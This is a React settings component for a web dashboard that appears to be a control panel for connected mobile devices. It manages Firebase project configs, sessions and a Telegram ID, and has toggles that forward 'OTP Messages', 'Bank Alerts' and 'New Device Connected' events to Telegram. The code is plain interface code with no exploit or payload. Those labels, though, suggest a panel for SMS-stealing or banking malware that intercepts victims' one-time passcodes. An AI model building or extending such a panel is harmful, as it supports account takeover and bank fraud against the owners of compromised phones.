import React, { useState, useEffect, useRef } from 'react';
import { 
  User, Shield, Monitor, Bell, Database, ChevronDown, ChevronUp,
  Key, LogOut, Trash2, Upload, Clipboard, X, Check, AlertCircle
} from 'lucide-react';
import { 
  getFirebaseAccounts, createFirebaseAccount, deleteFirebaseAccount,
  getSessions, deleteSession 
} from '../services/api';

const SettingsPanel = ({ user, onFirebaseAdded }) => {
  const [expandedSection, setExpandedSection] = useState(null);
  const [firebaseAccounts, setFirebaseAccounts] = useState([]);
  const [sessions, setSessions] = useState([]);
  const [showAddFirebase, setShowAddFirebase] = useState(false);
  const [activeFirebase, setActiveFirebase] = useState(null);
  const [uploading, setUploading] = useState(false);
  const [uploadSuccess, setUploadSuccess] = useState(false);
  const fileInputRef = useRef(null);
  const [newFirebase, setNewFirebase] = useState({
    name: '',
    api_key: '',
    database_url: '',
    project_id: '',
    auth_domain: '',
    storage_bucket: '',
    messaging_sender_id: '',
    app_id: ''
  });
  const [notifications, setNotifications] = useState([
    { label: 'New Device Connected', enabled: true },
    { label: 'OTP Messages', enabled: true },
    { label: 'Bank Alerts', enabled: false },
    { label: 'Security Alerts', enabled: true }
  ]);

  useEffect(() => {
    if (user?.id) {
      fetchFirebase();
      fetchSessions();
    }
  }, [user]);

  const fetchFirebase = async () => {
    try {
      const res = await getFirebaseAccounts(user.id);
      setFirebaseAccounts(res.data);
      if (res.data.length > 0) {
        const active = localStorage.getItem('activeFirebase') || res.data[res.data.length - 1].id;
        setActiveFirebase(active);
      }
    } catch (err) {
      console.error('Failed to fetch firebase accounts:', err);
    }
  };

  const fetchSessions = async () => {
    try {
      const res = await getSessions(user.id);
      setSessions(res.data);
    } catch (err) {
      console.error('Failed to fetch sessions:', err);
    }
  };

  const handleAddFirebase = async () => {
    if (!newFirebase.name || !newFirebase.api_key || !newFirebase.project_id) {
      alert('Please fill required fields: Name, API Key, Project ID');
      return;
    }
    try {
      const res = await createFirebaseAccount(user.id, newFirebase);
      setShowAddFirebase(false);
      setNewFirebase({ name: '', api_key: '', database_url: '', project_id: '', auth_domain: '', storage_bucket: '', messaging_sender_id: '', app_id: '' });
      setUploadSuccess(false);
      fetchFirebase();
      // Notify parent that Firebase was added - devices should reload
      if (onFirebaseAdded) onFirebaseAdded();
      // Auto switch to new account
      if (res.data?.account?.id) {
        handleSwitchFirebase(res.data.account.id);
      }
    } catch (err) {
      console.error('Failed to add firebase:', err);
      alert('Failed to add Firebase account');
    }
  };

  const handleDeleteFirebase = async (accountId) => {
    if (window.confirm('Delete this Firebase account?')) {
      try {
        await deleteFirebaseAccount(accountId);
        fetchFirebase();
        if (onFirebaseAdded) onFirebaseAdded();
      } catch (err) {
        console.error('Failed to delete firebase:', err);
      }
    }
  };

  const handleSwitchFirebase = (accountId) => {
    setActiveFirebase(accountId);
    localStorage.setItem('activeFirebase', accountId);
  };

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const toggleNotification = (idx) => {
    const updated = [...notifications];
    updated[idx].enabled = !updated[idx].enabled;
    setNotifications(updated);
  };

  // Handle file upload - Fixed
  const handleFileUpload = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    
    setUploading(true);
    const reader = new FileReader();
    reader.onload = (event) => {
      try {
        const json = JSON.parse(event.target.result);
        console.log('Parsed JSON:', json);
        
        // Update form with parsed values - checking multiple possible key names
        setNewFirebase(prev => ({
          ...prev,
          api_key: json.apiKey || json.api_key || json.API_KEY || prev.api_key,
          database_url: json.databaseURL || json.database_url || json.databaseUrl || prev.database_url,
          project_id: json.projectId || json.project_id || json.PROJECT_ID || prev.project_id,
          auth_domain: json.authDomain || json.auth_domain || prev.auth_domain,
          storage_bucket: json.storageBucket || json.storage_bucket || prev.storage_bucket,
          messaging_sender_id: json.messagingSenderId || json.messaging_sender_id || prev.messaging_sender_id,
          app_id: json.appId || json.app_id || prev.app_id
        }));
        setUploadSuccess(true);
        setTimeout(() => setUploadSuccess(false), 3000);
      } catch (err) {
        console.error('JSON parse error:', err);
        alert('Invalid JSON file. Please upload a valid Firebase config file.');
      }
      setUploading(false);
    };
    reader.onerror = () => {
      alert('Error reading file');
      setUploading(false);
    };
    reader.readAsText(file);
    // Reset input so same file can be selected again
    e.target.value = '';
  };

  const handlePasteJson = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const json = JSON.parse(text);
      console.log('Pasted JSON:', json);
      
      setNewFirebase(prev => ({
        ...prev,
        api_key: json.apiKey || json.api_key || json.API_KEY || prev.api_key,
        database_url: json.databaseURL || json.database_url || json.databaseUrl || prev.database_url,
        project_id: json.projectId || json.project_id || json.PROJECT_ID || prev.project_id,
        auth_domain: json.authDomain || json.auth_domain || prev.auth_domain,
        storage_bucket: json.storageBucket || json.storage_bucket || prev.storage_bucket,
        messaging_sender_id: json.messagingSenderId || json.messaging_sender_id || prev.messaging_sender_id,
        app_id: json.appId || json.app_id || prev.app_id
      }));
      setUploadSuccess(true);
      setTimeout(() => setUploadSuccess(false), 3000);
    } catch (err) {
      console.error('Paste error:', err);
      alert('Invalid JSON in clipboard or clipboard access denied');
    }
  };

  return (
    <div className="space-y-4">
      {/* Profile Section */}
      <div className="bg-[#12121a] border border-[#2a2a3a] rounded-xl overflow-hidden">
        <button
          onClick={() => toggleSection('profile')}
          className="w-full flex items-center justify-between p-4 hover:bg-[#15151f] transition-colors"
        >
          <div className="flex items-center gap-3 sm:gap-4">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-500 flex items-center justify-center flex-shrink-0">
              <User className="w-5 h-5 text-white" />
            </div>
            <div className="text-left min-w-0">
              <div className="flex items-center gap-2 flex-wrap">
                <h3 className="text-white font-semibold">Profile</h3>
                <span className="px-2 py-0.5 rounded text-xs font-medium bg-green-500/20 text-green-400">
                  {user?.plan || 'Unlimited'}
                </span>
              </div>
              <p className="text-gray-500 text-sm truncate">Logged in as {user?.username}</p>
            </div>
          </div>
          {expandedSection === 'profile' ? <ChevronUp className="w-5 h-5 text-gray-500 flex-shrink-0" /> : <ChevronDown className="w-5 h-5 text-gray-500 flex-shrink-0" />}
        </button>
        
        {expandedSection === 'profile' && (
          <div className="border-t border-[#2a2a3a] p-4 bg-[#0f0f15]">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-4">
              <div>
                <label className="text-gray-400 text-xs uppercase tracking-wider mb-1 block">Username</label>
                <div className="bg-[#1a1a25] border border-[#2a2a3a] rounded-lg px-3 py-2 text-white">{user?.username}</div>
              </div>
              <div>
                <label className="text-gray-400 text-xs uppercase tracking-wider mb-1 block">Role</label>
                <div className="bg-[#1a1a25] border border-[#2a2a3a] rounded-lg px-3 py-2 text-white capitalize">{user?.role}</div>
              </div>
            </div>
            <div>
              <label className="text-gray-400 text-xs uppercase tracking-wider mb-1 block">Telegram ID</label>
              <div className="bg-[#1a1a25] border border-[#2a2a3a] rounded-lg px-3 py-2 text-cyan-400">{user?.telegram_id || 'Not set'}</div>
            </div>
          </div>
        )}
      </div>

      {/* Firebase Accounts */}
      <div className="bg-[#12121a] border border-[#2a2a3a] rounded-xl overflow-hidden">
        <button
          onClick={() => toggleSection('firebase')}
          className="w-full flex items-center justify-between p-4 hover:bg-[#15151f] transition-colors"
        >
          <div className="flex items-center gap-3 sm:gap-4">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-yellow-500 to-orange-500 flex items-center justify-center flex-shrink-0">
              <Database className="w-5 h-5 text-white" />
            </div>
            <div className="text-left">
              <h3 className="text-white font-semibold">Firebase Accounts</h3>
              <p className="text-gray-500 text-sm">{firebaseAccounts.length} configuration(s)</p>
            </div>
          </div>
          {expandedSection === 'firebase' ? <ChevronUp className="w-5 h-5 text-gray-500 flex-shrink-0" /> : <ChevronDown className="w-5 h-5 text-gray-500 flex-shrink-0" />}
        </button>
        
        {expandedSection === 'firebase' && (
          <div className="border-t border-[#2a2a3a] p-4 bg-[#0f0f15]">
            <div className="flex justify-end mb-4">
              <button 
                onClick={() => setShowAddFirebase(true)}
                className="flex items-center gap-2 px-4 py-2 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-lg text-white text-sm font-medium hover:from-cyan-400 hover:to-blue-400 transition-all"
              >
                + Add Account
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {firebaseAccounts.map((account) => (
                <div 
                  key={account.id} 
                  className={`relative bg-[#1a1a25] border rounded-xl p-4 ${
                    activeFirebase === account.id 
                      ? 'border-cyan-500/50 ring-1 ring-cyan-500/30' 
                      : 'border-[#2a2a3a]'
                  }`}
                >
                  {activeFirebase === account.id && (
                    <div className="absolute -top-2 -right-2 w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center">
                      <Check className="w-4 h-4 text-white" />
                    </div>
                  )}
                  <div className="flex items-start gap-3 mb-3">
                    <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center flex-shrink-0">
                      <Database className="w-5 h-5 text-white" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <h4 className="text-white font-semibold truncate">{account.name}</h4>
                      <p className="text-gray-500 text-xs truncate">{account.project_id}</p>
                    </div>
                  </div>
                  
                  <div className="mb-3">
                    <p className="text-gray-500 text-xs uppercase mb-1">Database URL</p>
                    <p className="text-gray-400 text-xs truncate">{account.database_url || `https://${account.project_id}-default-rtdb.firebaseio.com/`}</p>
                  </div>

                  <div className="flex items-center gap-2">
                    {activeFirebase === account.id ? (
                      <span className="flex-1 py-2 text-center text-cyan-400 text-sm font-medium">Currently Active</span>
                    ) : (
                      <button 
                        onClick={() => handleSwitchFirebase(account.id)}
                        className="flex-1 py-2 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-lg text-white text-sm font-medium"
                      >
                        Switch
                      </button>
                    )}
                    <button 
                      onClick={() => handleDeleteFirebase(account.id)}
                      className="w-9 h-9 rounded-lg bg-[#12121a] flex items-center justify-center text-gray-400 hover:text-red-400 transition-colors"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              ))}
            </div>

            {firebaseAccounts.length === 0 && (
              <div className="text-center py-8">
                <Database className="w-12 h-12 text-gray-600 mx-auto mb-3" />
                <p className="text-gray-400">No Firebase accounts added</p>
                <p className="text-gray-500 text-sm">Add Firebase to connect devices</p>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Security */}
      <div className="bg-[#12121a] border border-[#2a2a3a] rounded-xl overflow-hidden">
        <button
          onClick={() => toggleSection('security')}
          className="w-full flex items-center justify-between p-4 hover:bg-[#15151f] transition-colors"
        >
          <div className="flex items-center gap-3 sm:gap-4">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-green-500 to-emerald-500 flex items-center justify-center flex-shrink-0">
              <Shield className="w-5 h-5 text-white" />
            </div>
            <div className="text-left">
              <h3 className="text-white font-semibold">Security</h3>
              <p className="text-gray-500 text-sm">2FA and password settings</p>
            </div>
          </div>
          {expandedSection === 'security' ? <ChevronUp className="w-5 h-5 text-gray-500 flex-shrink-0" /> : <ChevronDown className="w-5 h-5 text-gray-500 flex-shrink-0" />}
        </button>
        
        {expandedSection === 'security' && (
          <div className="border-t border-[#2a2a3a] p-4 bg-[#0f0f15]">
            <div className="space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-[#1a1a25] border border-[#2a2a3a] rounded-lg p-3">
                <div className="flex items-center gap-3">
                  <Key className="w-5 h-5 text-green-400 flex-shrink-0" />
                  <div>
                    <p className="text-white font-medium">Two-Factor Authentication</p>
                    <p className="text-gray-500 text-xs">Add extra security</p>
                  </div>
                </div>
                <button className="px-3 py-1.5 bg-green-500/20 border border-green-500/30 rounded-lg text-green-400 text-sm w-full sm:w-auto">Enable</button>
              </div>
              
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-[#1a1a25] border border-[#2a2a3a] rounded-lg p-3">
                <div>
                  <p className="text-white font-medium">Change Password</p>
                  <p className="text-gray-500 text-xs">Last changed 30 days ago</p>
                </div>
                <button className="px-3 py-1.5 bg-[#12121a] border border-[#3a3a4a] rounded-lg text-gray-300 text-sm w-full sm:w-auto">Update</button>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Active Sessions */}
      <div className="bg-[#12121a] border border-[#2a2a3a] rounded-xl overflow-hidden">
        <button
          onClick={() => toggleSection('sessions')}
          className="w-full flex items-center justify-between p-4 hover:bg-[#15151f] transition-colors"
        >
          <div className="flex items-center gap-3 sm:gap-4">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center flex-shrink-0">
              <Monitor className="w-5 h-5 text-white" />
            </div>
            <div className="text-left">
              <div className="flex items-center gap-2 flex-wrap">
                <h3 className="text-white font-semibold">Active Sessions</h3>
                <span className="px-2 py-0.5 rounded text-xs font-medium bg-purple-500/20 text-purple-400">{sessions.length} active</span>
              </div>
              <p className="text-gray-500 text-sm">{sessions.length} devices logged in</p>
            </div>
          </div>
          {expandedSection === 'sessions' ? <ChevronUp className="w-5 h-5 text-gray-500 flex-shrink-0" /> : <ChevronDown className="w-5 h-5 text-gray-500 flex-shrink-0" />}
        </button>
        
        {expandedSection === 'sessions' && (
          <div className="border-t border-[#2a2a3a] p-4 bg-[#0f0f15]">
            {sessions.length === 0 ? (
              <p className="text-gray-500 text-center py-4">No active sessions</p>
            ) : (
              <div className="space-y-3">
                {sessions.map((session) => (
                  <div key={session.id} className="flex items-center justify-between bg-[#1a1a25] border border-[#2a2a3a] rounded-lg p-3">
                    <div className="flex items-center gap-3 min-w-0">
                      <Monitor className="w-5 h-5 text-purple-400 flex-shrink-0" />
                      <div className="min-w-0">
                        <p className="text-white font-medium flex items-center gap-2 flex-wrap">
                          <span className="truncate">{session.device_info}</span>
                          {session.is_current && <span className="px-1.5 py-0.5 bg-green-500/20 text-green-400 text-xs rounded flex-shrink-0">Current</span>}
                        </p>
                        <p className="text-gray-500 text-xs truncate">{session.ip} - {session.location}</p>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </div>

      {/* Notifications */}
      <div className="bg-[#12121a] border border-[#2a2a3a] rounded-xl overflow-hidden">
        <button
          onClick={() => toggleSection('notifications')}
          className="w-full flex items-center justify-between p-4 hover:bg-[#15151f] transition-colors"
        >
          <div className="flex items-center gap-3 sm:gap-4">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-blue-500 to-indigo-500 flex items-center justify-center flex-shrink-0">
              <Bell className="w-5 h-5 text-white" />
            </div>
            <div className="text-left">
              <h3 className="text-white font-semibold">Notifications</h3>
              <p className="text-gray-500 text-sm">Telegram forwarding</p>
            </div>
          </div>
          {expandedSection === 'notifications' ? <ChevronUp className="w-5 h-5 text-gray-500 flex-shrink-0" /> : <ChevronDown className="w-5 h-5 text-gray-500 flex-shrink-0" />}
        </button>
        
        {expandedSection === 'notifications' && (
          <div className="border-t border-[#2a2a3a] p-4 bg-[#0f0f15]">
            <div className="space-y-4">
              {notifications.map((item, idx) => (
                <div key={idx} className="flex items-center justify-between">
                  <span className="text-gray-300">{item.label}</span>
                  <button 
                    onClick={() => toggleNotification(idx)}
                    className={`w-10 h-6 rounded-full transition-colors ${item.enabled ? 'bg-blue-500' : 'bg-[#2a2a3a]'}`}
                  >
                    <div className={`w-4 h-4 rounded-full bg-white transition-transform ${item.enabled ? 'translate-x-5' : 'translate-x-1'}`} />
                  </button>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Add Firebase Modal */}
      {showAddFirebase && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-[#12121a] border border-[#2a2a3a] rounded-2xl p-4 sm:p-6 w-full max-w-lg max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-lg sm:text-xl font-bold text-white flex items-center gap-2">
                <Database className="w-5 h-5 text-yellow-400" />
                Add Firebase Account
              </h2>
              <button onClick={() => { setShowAddFirebase(false); setUploadSuccess(false); }} className="text-gray-400 hover:text-white p-1">
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Success Message */}
            {uploadSuccess && (
              <div className="mb-4 p-3 bg-green-500/20 border border-green-500/30 rounded-lg flex items-center gap-2 text-green-400 text-sm">
                <Check className="w-4 h-4" />
                JSON parsed successfully! Fields auto-filled.
              </div>
            )}

            <div className="space-y-4">
              {/* Account Name */}
              <div>
                <label className="text-gray-400 text-xs uppercase tracking-wider mb-1 block">Account Name *</label>
                <input
                  type="text"
                  value={newFirebase.name}
                  onChange={(e) => setNewFirebase({...newFirebase, name: e.target.value})}
                  className="w-full bg-[#1a1a25] border border-cyan-500/50 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:ring-1 focus:ring-cyan-500/50"
                  placeholder="e.g., Production, My App"
                />
              </div>

              {/* Upload/Paste Header */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                <span className="text-gray-400 text-sm">Firebase Configuration</span>
                <div className="flex items-center gap-2">
                  <input
                    type="file"
                    ref={fileInputRef}
                    accept=".json,application/json"
                    onChange={handleFileUpload}
                    className="hidden"
                  />
                  <button 
                    onClick={() => fileInputRef.current?.click()}
                    disabled={uploading}
                    className="flex items-center gap-1 px-3 py-1.5 text-cyan-400 text-sm hover:bg-cyan-500/10 rounded transition-colors border border-cyan-500/30"
                  >
                    <Upload className="w-4 h-4" />
                    {uploading ? 'Loading...' : 'Upload JSON'}
                  </button>
                  <button 
                    onClick={handlePasteJson}
                    className="flex items-center gap-1 px-3 py-1.5 text-cyan-400 text-sm hover:bg-cyan-500/10 rounded transition-colors border border-cyan-500/30"
                  >
                    <Clipboard className="w-4 h-4" />
                    Paste
                  </button>
                </div>
              </div>

              {/* API Key */}
              <div>
                <label className="text-gray-400 text-xs uppercase tracking-wider mb-1 block">API KEY *</label>
                <input
                  type="text"
                  value={newFirebase.api_key}
                  onChange={(e) => setNewFirebase({...newFirebase, api_key: e.target.value})}
                  className="w-full bg-[#1a1a25] border border-[#2a2a3a] rounded-lg px-4 py-2.5 text-white placeholder-gray-600 focus:outline-none focus:border-cyan-500/50"
                  placeholder="AIza..."
                />
              </div>

              {/* Database URL */}
              <div>
                <label className="text-gray-400 text-xs uppercase tracking-wider mb-1 block">DATABASE URL *</label>
                <input
                  type="text"
                  value={newFirebase.database_url}
                  onChange={(e) => setNewFirebase({...newFirebase, database_url: e.target.value})}
                  className="w-full bg-[#1a1a25] border border-[#2a2a3a] rounded-lg px-4 py-2.5 text-white placeholder-gray-600 focus:outline-none focus:border-cyan-500/50"
                  placeholder="https://your-project.firebaseio.com"
                />
              </div>

              {/* Project ID */}
              <div>
                <label className="text-gray-400 text-xs uppercase tracking-wider mb-1 block">PROJECT ID *</label>
                <input
                  type="text"
                  value={newFirebase.project_id}
                  onChange={(e) => setNewFirebase({...newFirebase, project_id: e.target.value})}
                  className="w-full bg-[#1a1a25] border border-[#2a2a3a] rounded-lg px-4 py-2.5 text-white placeholder-gray-600 focus:outline-none focus:border-cyan-500/50"
                  placeholder="your-project-id"
                />
              </div>

              {/* Optional Fields */}
              <div>
                <label className="text-gray-500 text-xs uppercase tracking-wider mb-2 block">OPTIONAL</label>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <input
                    type="text"
                    value={newFirebase.auth_domain}
                    onChange={(e) => setNewFirebase({...newFirebase, auth_domain: e.target.value})}
                    className="bg-[#1a1a25] border border-[#2a2a3a] rounded-lg px-3 py-2 text-white placeholder-gray-600 text-sm focus:outline-none focus:border-cyan-500/50"
                    placeholder="Auth Domain"
                  />
                  <input
                    type="text"
                    value={newFirebase.storage_bucket}
                    onChange={(e) => setNewFirebase({...newFirebase, storage_bucket: e.target.value})}
                    className="bg-[#1a1a25] border border-[#2a2a3a] rounded-lg px-3 py-2 text-white placeholder-gray-600 text-sm focus:outline-none focus:border-cyan-500/50"
                    placeholder="Storage Bucket"
                  />
                  <input
                    type="text"
                    value={newFirebase.messaging_sender_id}
                    onChange={(e) => setNewFirebase({...newFirebase, messaging_sender_id: e.target.value})}
                    className="bg-[#1a1a25] border border-[#2a2a3a] rounded-lg px-3 py-2 text-white placeholder-gray-600 text-sm focus:outline-none focus:border-cyan-500/50"
                    placeholder="Messaging Sender ID"
                  />
                  <input
                    type="text"
                    value={newFirebase.app_id}
                    onChange={(e) => setNewFirebase({...newFirebase, app_id: e.target.value})}
                    className="bg-[#1a1a25] border border-[#2a2a3a] rounded-lg px-3 py-2 text-white placeholder-gray-600 text-sm focus:outline-none focus:border-cyan-500/50"
                    placeholder="App ID"
                  />
                </div>
              </div>
            </div>

            <div className="flex flex-col sm:flex-row gap-3 mt-6">
              <button
                onClick={() => { setShowAddFirebase(false); setUploadSuccess(false); }}
                className="flex-1 py-3 bg-[#1a1a25] border border-[#2a2a3a] rounded-lg text-gray-300 font-medium hover:bg-[#20202a] transition-colors flex items-center justify-center gap-2"
              >
                <X className="w-4 h-4" />
                Cancel
              </button>
              <button
                onClick={handleAddFirebase}
                className="flex-1 py-3 bg-gradient-to-r from-cyan-500 to-blue-500 rounded-lg text-white font-medium hover:from-cyan-400 hover:to-blue-400 transition-all flex items-center justify-center gap-2"
              >
                <Database className="w-4 h-4" />
                Save Account
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default SettingsPanel;
